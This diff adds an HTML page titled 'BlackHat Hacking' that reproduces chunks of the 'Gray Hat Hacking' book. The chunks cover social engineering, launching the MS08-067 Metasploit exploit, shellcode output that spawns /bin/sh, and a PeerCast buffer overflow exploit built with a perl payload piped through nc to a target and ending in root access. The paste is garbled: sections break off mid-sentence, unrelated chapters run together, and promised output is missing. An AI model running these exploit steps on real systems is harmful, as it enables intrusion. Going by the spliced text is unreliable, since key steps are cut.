@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="file:///C:/Users/pc/Desktop/Rat%20web/Ethical%20Hacking/stylesheet.css">
+    <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS36_URwTaUZY6byaoTBnJQvQ-FNFRCagm5GA&s">
+    <title>BlackHat Hacking</title>
+</head>
+<body>
+    
+<div id="tool">
+    <h1>Top 2 hacking Tools</h1>
+    <a href="file:///C:/Users/pc/Desktop/Rat%20web/Books/BooksLink.html">Top 7 Hacking Books</a>
+    <h2>1 -Social Engineering Toolkit</h2>
+    <h2>2 -Using Metasploit</h2>
+</div>
+
+    <h3>1 -Social Engineering Toolkit</h3>
+    <pre>
+        Social Engineering Attacks
+        Social engineering is a way to get someone to do something they wouldn’t normally do 
+        for you, such as give you a private telephone number or internal confidential information, by creating a false trust relationship with them. It’s no different from a common 
+        confidence game, also known as a “con,” played by criminals the world over every day. 
+        You could even go as far as to say that the Greek’s Trojan horse was an early act of social 
+        engineering. That it successfully put the Greek army inside the city of Troy in mere 
+        hours after ten years of siege had failed is worth noting. The Greeks were able to decisively defeat the Trojans in one evening once inside the city wall, a theme often repeated on the digital battlefield today.
+        In this chapter, we’re going to talk about social engineering in the context of modern 
+        information security practice. You’re going to learn how to perform social engineering 
+        so that you are better prepared to defend against it. Like so many techniques in this 
+        book, the only thing that separates the gray hat hacker from a common criminal is 
+        ethical behavior. This is especially true for social engineering, as it is arguably one of the 
+        most powerful ways to gain access to your target’s information assets.
+        In this chapter, we cover the following topics:
+        • How a social engineering attack works
+        • Conducting a social engineering attack
+        • Common attacks used in penetration testing
+        • Preparing yourself for face-to-face attacks
+        • Defending against social engineering attacks
+        How a Social Engineering Attack Works
+        Social engineering attacks cover a wide range of activities. Phishing, for instance, is a 
+        social engineering attack (SEA). The victim receives a legitimate-looking e-mail, follows 
+        a link to a legitimate-looking website they’re familiar with, and often divulges sensitive 
+        information to a malicious third party. As end users are made aware of such activities, 
+        the attacks generally must become more sophisticated in order to remain effective. Recently, attacks of this nature have become narrowly targeted at specific companies, often mimicking internal system logins and targeting only individuals working at the 
+        subject company. It’s an electronic numbers game conducted from afar, and the reason 
+        it is so common is that it works.</pre>
+        <h3>2 -Using Metasploit</h3>
+        <pre>Using Metasploit 8
+            This chapter will show you how to use Metasploit, a penetration testing platform for 
+            developing and launching exploits. In this chapter, we discuss the following topics:
+            • Metasploit: the big picture
+            • Getting Metasploit
+            • Using the Metasploit console to launch exploits
+            • Exploiting client-side vulnerabilities with Metasploit
+            • Penetration testing with Metasploit’s Meterpreter
+            • Automating and Scripting Metasploit
+            • Going further with Metasploit
+            Metasploit: The Big Picture
+            Metasploit is a free, downloadable framework that makes it very easy to acquire, 
+            develop, and launch exploits for computer software vulnerabilities. It ships with professional-grade exploits for hundreds of known software vulnerabilities. When H.D. 
+            Moore released Metasploit in 2003, it permanently changed the computer security 
+            scene. Suddenly, anyone could become a hacker and everyone had access to exploits for 
+            unpatched and recently patched vulnerabilities. Software vendors could no longer delay fixing publicly disclosed vulnerabilities, because the Metasploit crew was hard at 
+            work developing exploits that would be released for all Metasploit users.
+            Metasploit was originally designed as an exploit development platform, and we’ll 
+            use it later in the book to show you how to develop exploits. However, it is probably 
+            more often used today by security professionals and hobbyists as a “point, click, root” 
+            environment to launch exploits included with the framework.
+            We’ll spend the majority of this chapter showing Metasploit examples. To save 
+            space, we’ll strategically snip out nonessential text, so the output you see while following along might not be identical to what you see in this book.
+            Getting Metasploit
+            Metasploit runs natively on Linux, BSD, Mac OS X, Windows (via Cygwin), Nokia 
+            N900, and jailbroken Apple iPhones. You can enlist in the development source tree 
+            to get the very latest copy of the framework, or just use the packaged installers from www.metasploit.com/framework/download/. The Windows installer may take quite a 
+            while to complete as it contains installers for Cygwin, Ruby, Subversion, VNCViewer, 
+            WinVI, Nmap, WinPcap, and other required packages.
+            References
+            Installing Metasploit on Mac OS X www.metasploit.com/redmine/projects/
+            framework/wiki/Install_MacOSX
+            Installing Metasploit on Other Linux Distributions www.metasploit.com/
+            redmine/projects/framework/wiki/Install_Linux
+            Installing Metasploit on Windows www.metasploit.com/redmine/projects/
+            framework/wiki/Install_Windows
+            Using the Metasploit Console to Launch Exploits
+            Our first Metasploit demo involves exploiting the MS08-067 Windows XP vulnerability 
+            that led to the Conficker superworm of late 2008–early 2009. We’ll use Metasploit to 
+            get a remote command shell running on the unpatched Windows XP machine. Metasploit can pair any Windows exploit with any Windows payload. So, we can choose the 
+            MS08-067 vulnerability to open a command shell, create an administrator, start a remote VNC session, or do a bunch of other stuff discussed later in the chapter. Let’s get 
+            started.
+            $ ./msfconsole
+             888 888 d8b888
+             888 888 Y8P888
+             888 888 888
+            88888b.d88b. .d88b. 888888 8888b. .d8888b 88888b. 888 .d88b. 888888888
+            888 "888 "88bd8P Y8b888 "88b88K 888 "88b888d88""88b888888
+            888 888 88888888888888 .d888888"Y8888b.888 888888888 888888888
+            888 888 888Y8b. Y88b. 888 888 X88888 d88P888Y88..88P888Y88b.
+            888 888 888 "Y8888 "Y888"Y888888 88888P’88888P" 888 "Y88P" 888 "Y888
+             888
+             888
+             888
+             =[ metasploit v3.4.0-dev [core:3.4 api:1.0]
+            + -- --=[ 317 exploits - 93 auxiliary
+            + -- --=[ 216 payloads - 20 encoders - 6 nops
+             =[ svn r9114 updated today (2010.04.20)
+            msf >
+            The interesting commands to start with are
+            show <exploits | payloads>
+            info <exploit | payload> <name>
+            use <exploit-name>
+            You’ll find all the other commands by typing help or ?. To launch an MS08-067 
+            exploit, we’ll first need to find the Metasploit name for this exploit. We can use the 
+            search command to do so:
+            msf > search ms08-067
+[*] Searching loaded modules for pattern 'ms08-067'...
+Exploits
+========
+ Name Rank Description
+ ---- ---- -----------
+ windows/smb/ms08_067_netapi great Microsoft Server Service Relative Path
+ Stack Corruption
+The Metasploit name for this exploit is windows/smb/ms08_067_netapi. We’ll use 
+that exploit and then go looking for all the options needed to make the exploit work:
+msf > use windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) >
+Notice that the prompt changes to enter “exploit mode” when you use an exploit module. Any options or variables you set while configuring this exploit will be retained so 
+that you don’t have to reset the options every time you run it. You can get back to the 
+original launch state at the main console by issuing the back command:
+msf exploit(ms08_067_netapi) > back
+msf > use windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) >
+Different exploits have different options. Let’s see what options need to be set to 
+make the MS08-067 exploit work:
+msf exploit(ms08_067_netapi) > show options
+Module options:
+ Name Current Setting Required Description
+ ---- --------------- -------- -----------
+ RHOST yes The target address
+ RPORT 445 yes Set the SMB service port
+ SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)
+This exploit requires a target address, the port number on which SMB (Server Message Block) listens, and the name of the pipe exposing this functionality:
+msf exploit(ms08_067_netapi) > set RHOST 192.168.1.6
+RHOST => 192.168.1.6
+As you can see, the syntax to set an option is as follows:
+set <OPTION-NAME> <option>
+NOTE Earlier versions of Metasploit were particular about the case of the 
+option name and option, so examples in this chapter always use uppercase if 
+the option is listed in u# gcc –o exploit2 exploit2.c # after adding \xcc before shellcode
+# gdb exploit2 --quiet
+(no debugging symbols found)...(gdb)
+(gdb) run
+Starting program: /root/book/exploit2
+[***] using address: 0xbfffffc2
+(no debugging symbols found)...(no debugging symbols found)...
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x40000b00 in _start () from /lib/ld-linux.so.2
+(gdb) x/20s 0xbfffffc2 /*this was output from exploit2 above */
+0xbfffffc2:
+"ë\037^\211v\b1À\210F\a\211F\f°\v\211ó\215N\b\215V\fÍ\2001Û\211Ø@Í\200èÜÿÿÿ
+bin/sh"
+0xbffffff0: "./smallbuff"
+0xbffffffc: ""
+0xbffffffd: ""
+0xbffffffe: ""
+0xbfffffff: ""
+0xc0000000: <Address 0xc0000000 out of bounds>
+0xc0000000: <Address 0xc0000000 out of bounds>
+References
+Buffer Overflow Exploits Tutorial mixter.void.ru/exploit.html
+Buffer Overflows Demystified (Murat Balaban) www.enderunix.org/docs/eng/
+bof-eng.txt
+Hacking: The Art of Exploitation, Second Edition (Jon Erickson) No Starch Press, 2008
+“Smashing the Stack for Fun and Profit” (Aleph One) www.phrack.com/issues
+.html?issue=49&id=14#article
+“Vulnerabilities in Your Code – Advanced Buffer Overflows” (CoreSecurity)
+packetstormsecurity.nl/papers/general/core_vulnerabilities.pdf
+Exploit Development Process
+Now that we have covered the basics, you are ready to look at a real-world example. In 
+the real world, vulnerabilities are not always as straightforward as the meet.c example 
+and require a repeatable process to successfully exploit. The exploit development process generally follows these steps:
+• Control eip
+• Determine the offset(s)
+• Determine the attack vector
+• Build the exploit sandwich
+• Test the exploit
+• Debug the exploit if needed
+At first, you should follow these steps exactly; later, you may combine a couple of 
+these steps as required.
+Gray Hat Hacking, The Ethical Hacker’s Handbook, Third Edition
+218
+Control eip
+In this real-world example, we are going to look at the PeerCast v0.1214 server from 
+http://peercast.org. This server is widely used to serve up radio stations on the Internet. 
+There are several vulnerabilities in this application. We will focus on the 2006 advisory 
+www.infigo.hr/in_focus/INFIGO-2006-03-01, which describes a buffer overflow in the 
+v0.1214 URL string. It turns out that if you attach a debugger to the server and send the 
+server a URL that looks like this:
+http://localhost:7144/stream/?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA....(800)
+your debugger should break as follows:
+gdb output...
+[Switching to Thread 180236 (LWP 4526)]
+0x41414141 in ?? ()
+(gdb) i r eip
+eip 0x41414141 0x41414141
+(gdb)
+As you can see, we have a classic buffer overflow and have total control of eip. Now 
+that we have accomplished the first step of the exploit development process, let’s move 
+to the next step.
+Determine the Offset(s)
+With control of eip, we need to find out exactly how many characters it took to cleanly 
+overwrite eip (and nothing more). The easiest way to do this is with Metasploit’s pattern tools.
+First, let’s start the PeerCast v0.1214 server and attach our debugger with the following commands:
+#./peercast &
+[1] 10794
+#netstat –pan |grep 7144
+tcp 0 0 0.0.0.:7144 0.0.0.0:* LISTEN 10794/peercast
+As you can see, the process ID (PID) in our case was 10794; yours will be different. Now 
+we can attach to the process with gdb and tell gdb to follow all child processes:
+#gdb –q
+(gdb) set follow-fork-mode child
+(gdb)attach 10794
+---Output omitted for brevity---
+Chapter 11: Basic Linux Exploits
+219
+PART III
+Next, we can use Metasploit to create a large pattern of characters and feed it to the 
+PeerCast server using the following perl command from within a Metasploit Framework Cygwin shell. For this example, we chose to use a Windows attack system running 
+Metasploit 2.6.
+~/framework/lib
+$ perl –e 'use Pex; print Pex::Text::PatternCreate(1010)'
+Gray Hat Hacking, The Ethical Hacker’s Handbook, Third Edition
+220
+On your Windows attack system, open Notepad and save a file called peercast.sh in 
+the program files/metasploit framework/home/framework/ directory.
+Paste in the preceding pattern you created and the following wrapper commands, 
+like this:
+perl -e 'print "GET /stream/?Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
+Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae
+1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6A
+g7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2
+Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al
+8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3A
+o4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9
+Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At
+5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0A
+w1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6
+Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb
+2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7B
+d8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3
+Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh\
+r\n";' |nc 10.10.10.151 7144
+Be sure to remove all hard carriage returns from the ends of each line. Make the 
+peercast.sh file executable, within your Metasploit Cygwin shell:
+$ chmod 755 ../peercast.sh
+Execute the peercast.sh attack script:
+$ ../peercast.sh
+As expected, when we run the attack script, our server crashes:
+The debugger breaks with eip set to 0x42306142 and esp set to 0x61423161. Using 
+Metasploit’s patternOffset.pl tool, we can determine where in the pattern we overwrote 
+eip and esp:
+Chapter 11: Basic Linux Exploits
+221
+PART III
+Determine the Attack Vector
+As can be seen in the last step, when the program crashed, the overwritten esp value 
+was exactly 4 bytes after the overwritten eip. Therefore, if we fill the attack buffer with 
+780 bytes of junk and then place 4 bytes to overwrite eip, we can then place our shellcode at this point and have access to it in esp when the program crashes, because the 
+value of esp matches the value of our buffer at exactly 4 bytes after eip (784). Each exploit is different, but in this case, all we have to do is find an assembly opcode that says 
+“jmp esp.” If we place the address of that opcode after 780 bytes of junk, the program 
+will continue executing that opcode when it crashes. At that point, our shellcode will 
+be jumped into and executed. This staging and execution technique will serve as our 
+attack vector for this exploit.
+To find the location of such an opcode in an ELF (Linux) file, you may use Metasploit’s msfelfscan tool:
+As you can see, the “jmp esp” opcode exists in several locations in the file. You cannot use an opcode that contains a “00” byte, which rules out the third one. For no 
+particular reason, we will use the second one: 0x0808ff97.
+Gray Hat Hacking, The Ethical Hacker’s Handbook, Third Edition
+222
+NOTE This opcode attack vector is not subject to stack randomization and 
+is therefore a useful technique around that kernel defense.
+Build the Exploit Sandwich
+We could build our exploit sandwich from scratch, but it is worth noting that Metasploit has a module for PeerCast v0.1212. All we need to do is modify the module to 
+add our newly found opcode (0x0808ff97) for PeerCast v0.1214 and set the default 
+target to that new value:
+Test the Exploit
+Restart the Metasploit console and load the new PeerCast module to test itWoot! It worked! After setting some basic options and exploiting, we gained root, 
+dumped “id,” and then proceeded to show the top of the /etc/password file.
+References
+Metasploit Conference Materials (Rapid7) www.metasploit.com/research/
+conferences
+Metasploit Unleashed online course (David Kennedy e
+</pre>
+    
+</body>
+</html>
